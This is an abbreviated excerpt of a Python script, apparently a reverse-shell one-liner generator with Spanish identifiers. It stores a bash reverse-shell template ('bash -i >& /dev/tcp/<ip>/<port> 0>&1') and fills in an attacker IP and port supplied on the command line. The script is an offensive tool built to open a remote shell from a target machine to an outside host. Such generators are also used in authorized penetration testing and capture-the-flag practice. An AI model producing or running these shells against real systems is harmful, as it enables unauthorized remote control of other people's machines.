...
class OneLinersMain:
    ...
    dicOneLiners = {'bash': 'bash -i >& /dev/tcp/--dir-ip--/--puerto-- 0>&1',
    ...
    def __init__(self, tipo, direc, puerto=80):
        self.__tipo = tipo
        self.__direc = direc
...
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"\n\t{Fore.RED}[!]{Fore.RESET} Usage: {Fore.GREEN}python3 oneliners.py{Fore.RESET} {Fore.YELLOW}<type>{Fore.RESET} {Fore.YELLOW}<dirección-ip>{Fore.RESET} {Fore.YELLOW}<puerto>{Fore.RESET} \n")
        ...
        dirIp = sys.argv[2]
        puerto = sys.argv[3]
        oneLinerCustom = OneLinersMain(typeRS, dirIp, puerto)
